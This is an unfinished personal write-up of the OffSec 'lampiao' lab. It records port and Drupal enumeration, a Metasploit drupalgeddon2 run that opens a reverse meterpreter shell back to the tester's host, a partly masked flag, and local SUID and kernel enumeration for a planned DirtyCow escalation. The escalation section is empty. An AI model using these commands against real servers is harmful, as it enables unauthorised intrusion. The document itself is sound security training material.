---
title: lampiao
date started: 2026-03-02 00:30:11
date completed
platform: Offsec
difficulty: medium
os: linux
tags: [drupal, medium]
---

# Scope

> In this lab, you will exploit a remote code execution (RCE) vulnerability in Drupal 7 to gain initial access. Privilege escalation is achieved using a kernel exploit (DirtyCow), targeting the vulnerable Linux kernel version.

## IP: 192.168.221.48

# Enumeration

## Ports

```bash
PORT     STATE SERVICE     REASON
22/tcp   open  ssh         syn-ack ttl 61
80/tcp   open  http        syn-ack ttl 61
1898/tcp open  cymtec-port syn-ack ttl 61
```

## Services

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 46b199607d81693cae1fc7ffc366e310 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAKeg3YDejlMII2nywaeS2HFxd09ak99X7NdFEfHDe/Fng3UwA+gQjhQZ03h09BWb45SfR2EIHLWQ4cN8NN+8bajVwsLwItjKNis+mVMI4Jd8HFMV064cuzcB+xbikI8jzV1GIN4G
clifo+luxym7exJvHgKcLpL1rNVZjzYxPhofAAAAFQCKP3vJ9wD7JSGsDao7IA97RPWROwAAAIAOFHw5FJFFG3bpKsmzhluq0dj1VdltQ51Wd3lqWFtoSncq14ZWMunQhHkKt+KLuPIccv1XmqJrbP9HEWe2E8hl4oT3R7
vzbEB/nvVILX3y68TR2/o0Iu5JMgy4uyXMVFFbdpZ3cOv4+fDbn7Yy9shhE+T144Utr0WvHHGvcged4QAAAIEAmqW1JA1Dj7CjHW64mRG+7uDNvb8InZplGWMVd0JINWgr1is4gRDnwldXukIDSA71cTkS3Al6mMCu0nft
LqxZKodcIeuGuKBWIHSTKN3/pzVrFjOiOfUQK7lH3pHzR6DxpOLOVLMsP4qOGa6CBG9R4UREUSFZ+j6mVSPgo+tU9do=
|   2048 f3e888f22dd0b2540b9cad6133595593 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCohkf0Lql5Q9/2RQx+I7+nJJ9hZfi+p0nYiwkia9NTSQlbQZ09JUGvfxRE3pYke/zu9TNCIcKCSdVuIg7VCIjvyyXlxIfhGm1KDIxa4yVSYY6nlp0PlNe/eMJu0eHm
Cul/RZR+QMml4Ov/DD7tBNARreXZtxgGG1cUp/51ad31VxOW0xZ8mteMAqyBYRmGPcE5EMFhB7iis8TGr5ZNvEq246RRG9yzDECYdOcGu0CaWdBn1CO9VKsr393RSEAY7dYDqDXssvA9Dw81Oqkek59OmLXBS0WFgnjxpf
bmdfvbDsm9WQ2jTMgq6NTp6yYYlYoxxc4kkwJDgO0lD75gN6+Z
|   256 ce632af7536e46e2ae81e3ffb716f452 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJgCFIaCKti2RYMo5AGFAE91s78Z0eBZp4I+MlPV2Sw9oTZaTTbGBeLLKpsHHAs0mw1rUm36GxzU4F1oU57nBcE=
|   256 c655ca073765e306c1d65b77dc23dfcc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAq63V1lqtuey7Q5i7rr9auAAqKBs27r5xq5k27l3XSb
80/tcp   open  http?   syn-ack ttl 61
| fingerprint-strings:
|   NULL:
|     _____ _ _
|     |_|/ ___ ___ __ _ ___ _ _
|     \x20| __/ (_| __ \x20|_| |_
|     ___/ __| |___/ ___|__,_|___/__, ( )
|     |___/
|     ______ _ _ _
|     ___(_) | | | |
|     \x20/ _` | / _ / _` | | | |/ _` | |
|_    __,_|__,_|_| |_|
1898/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-robots.txt: 36 disallowed entries
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Lampi\xC3\xA3o
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-ser
vice :
SF-Port80-TCP:V=7.93%I=7%D=3/2%Time=69A46B23%P=aarch64-unknown-linux-gnu%r
SF:(NULL,1179,"\x20_____\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\|_\x20\x20\x20_\|\x20\|\x2
SF:0\(\x20\)\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\n\x20\x20\|\x20\|\x20\|\x20\|_\|/\x20___\x20\x20\x20\x20___\x2
SF:0\x20__\x20_\x20___\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\n\x20\x20\|\x20\|\x20\|\x20__\|\x20/\x20__\|\x20\x20/\x20_\x20\\/\x
SF:20_`\x20/\x20__\|\x20\|\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
SF:x20_\|\x20\|_\|\x20\|_\x20\x20\\__\x20\\\x20\|\x20\x20__/\x20\(_\|\x20\
SF:\__\x20\\\x20\|_\|\x20\|_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\\___/\x20\
SF:\__\|\x20\|___/\x20\x20\\___\|\\__,_\|___/\\__,\x20\(\x20\)\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20__/\x20\|/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|___/\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\n______\x20_\x20\x20\x20\x20\x20\x20\x20_\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\n\|\x20\x20___\(_\)\x20\
SF:x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20
SF:\|\n\|\x20\|_\x20\x20\x20_\x20\x20\x20\x20__\|\x20\|_\x20\x20\x20_\x20_
SF:\x20__\x20___\x20\x20\x20__\x20_\x20\x20\x20\x20___\x20\x20__\x20_\x20_
SF:\x20\x20\x20_\x20\x20__\x20_\|\x20\|\n\|\x20\x20_\|\x20\|\x20\|\x20\x20
SF:/\x20_`\x20\|\x20\|\x20\|\x20\|\x20'_\x20`\x20_\x20\\\x20/\x20_`\x20\|\
SF:x20\x20/\x20_\x20\\/\x20_`\x20\|\x20\|\x20\|\x20\|/\x20_`\x20\|\x20\|\n
SF:\|\x20\|\x20\x20\x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|_\|\x20\|\x20\|\
SF:x20\|\x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|\x20\x20__/\x20\(_\|\x20\|\
SF:x20\|_\|\x20\|\x20\(_\|\x20\|_\|\n\\_\|\x20\x20\x20\|_\|\x20\x20\\__,_\
SF:|\\__,_\|_\|\x20\|_\|");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP (tcp 80)

- Goes to a landing page.
- Directory busting doesn't work
- Noting in pag

## HTTP (tcp 1898)

- Web server
  ![lampiao page](.images/img_20260302_015304.png)

- Directory busting reveals a directory structure that hints at a CMS.
  - Drupal 7 from the nmap output

- Possible usernames:
  - Eder
  - Tiago

### Drupal Enumeration

- Droopescan lists the possible version as 7.54
  - This is confirmed on the changelog

```bash
[Mar 02, 2026 - 01:46:20 (+08)] exegol-offsec lampiao # droopescan scan drupal --url $TARGET:1898
[+] Plugins found:
    profile http://192.168.221.48:1898/modules/profile/
    php http://192.168.221.48:1898/modules/php/
    image http://192.168.221.48:1898/modules/image/

[+] Themes found:
    seven http://192.168.221.48:1898/themes/seven/
    garland http://192.168.221.48:1898/themes/garland/

[+] Possible version(s):
    7.54

[+] Possible interesting urls found:
    Default changelog file - http://192.168.221.48:1898/CHANGELOG.txt
```

- This version of drupal is still vulnerable to drupalgeddon2

# Exploit

- This is the same as [dc-1](../dc-1/dc-1.md) -ish.
- Metasploit works on this as well

TODO
Work on a non-metasploit version of this.

```bash
msf exploit(unix/webapp/drupal_restws_exec) > use exploit/unix/webapp/drupal_drupalgeddon2
[*] Using configured payload php/meterpreter/reverse_tcp
msf exploit(unix/webapp/drupal_drupalgeddon2) > set rhosts 192.168.221.48
rhosts => 192.168.221.48
msf exploit(unix/webapp/drupal_drupalgeddon2) > set rport 1898
rport => 1898
msf exploit(unix/webapp/drupal_drupalgeddon2) > set lhost 192.168.45.216
lhost => 192.168.45.216
msf exploit(unix/webapp/drupal_drupalgeddon2) > run
[*] Started reverse TCP handler on 192.168.45.216:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (40004 bytes) to 192.168.221.48
[*] Meterpreter session 1 opened (192.168.45.216:4444 -> 192.168.221.48:35018) at 2026-03-02 02:14:44 +0800

meterpreter > info
Usage: info <module>

Prints information about a post-exploitation module

meterpreter > shell
Process 4885 created.
Channel 0 created.
whoami
www-data
```

- Local flag is inside home directory of user tiago

```bash
www-data@lampiao:/home/tiago$ cat local.txt
cat local.txt
****************cf9eb725f60f250b
```

# Internal Enumeration

- Users

```bash
www-data@lampiao:/home$ ls
ls
tiago
```

- Kernel

```bash
www-data@lampiao:/home$ uname -a
uname -a
Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux
```

- Compilation

```bash
www-data@lampiao:/$ file /bin/bash
file /bin/bash
/bin/bash: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=4ead65aeca4e9f1eabf3a
0d63eb1f96c225b25fd, stripped
```

- SUID binaries

```bash
www-data@lampiao:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/ping6
/bin/fusermount
/bin/mount
/bin/su
/bin/umount
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/mtr
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/sbin/uuidd
```

- GUID binaries

```bash
www-data@lampiao:/var/www/html$ find / -perm -g=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
/usr/bin/chage
/usr/bin/dotlockfile
/usr/bin/bsd-write
/usr/bin/mail-lock
/usr/bin/mail-touchlock
/usr/bin/wall
/usr/bin/at
/usr/bin/screen
/usr/bin/expiry
/usr/bin/crontab
/usr/bin/ssh-agent
/usr/bin/mail-unlock
/usr/bin/mlocate
/usr/sbin/uuidd
/sbin/unix_chkpwd
```

# Privilege Escalation

# Remediation

# Lessons Learnt
